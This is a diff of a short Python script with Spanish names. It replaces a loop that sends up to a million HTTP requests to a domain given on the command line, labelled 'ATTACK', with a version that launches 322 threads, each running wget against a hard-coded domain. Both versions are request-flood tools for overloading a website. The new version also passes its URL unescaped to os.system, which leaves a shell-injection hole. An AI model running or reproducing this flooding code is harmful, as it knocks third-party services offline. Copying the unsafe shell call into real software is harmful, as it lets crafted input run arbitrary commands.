@@ -1,35 +1,23 @@
-import sys
-import threading
-import requests
+import os
+import concurrent.futures
 
-def ataque(dominio):
-    print('DOMAIN ' + str(dominio))
-    print('ATTACK START')
-    num_max = 1000000  # Número máximo de ataques
-    success_count = 0  # Contador de solicitudes exitosas
-    failure_count = 0  # Contador de solicitudes fallidas
+def descargar_sitio_web(url, destino):
+    comando = f"wget -P {destino} {url}"
+    os.system(comando)
 
-    for x in range(num_max):
-        try:
-            response = requests.get(dominio)
-            if response.status_code == 200:
-                success_count += 1
-            else:
-                failure_count += 1
-            print('ATTACK #' + str(success_count + failure_count))
-        except:
-            failure_count += 1
-            print('ATTACK #' + str(success_count + failure_count))
+def descargar_sitio_web_concurrente(url, destino, num_hilos):
+    with concurrent.futures.ThreadPoolExecutor(max_workers=num_hilos) as executor:
+        futures = []
+        for _ in range(num_hilos):
+            future = executor.submit(descargar_sitio_web, url, destino)
+            futures.append(future)
+        
+        # Esperar a que se completen todas las descargas
+        concurrent.futures.wait(futures)
 
-    print('ATTACK COMPLETE')
-    print('Successful requests:', success_count)
-    print('Failed requests:', failure_count)
+# Ejemplo de uso
 
-if __name__ == "__main__":
-    if len(sys.argv) != 2:
-        print('Debe proporcionar un dominio como argumento de línea de comandos.')
-        sys.exit(1)
-
-    dominio = sys.argv[1]
-    t = threading.Thread(target=ataque, args=(dominio,))
-    t.start()
+num_hilos = 322
+url = "deamostwanted.info"  # Reemplaza con la URL o dirección IP correspondiente
+destino = "/home/ubuntu/jhgjgjhghhjhgh"  # Reemplaza con la ruta de destino adecuada
+descargar_sitio_web_concurrente(url, destino, num_hilos)
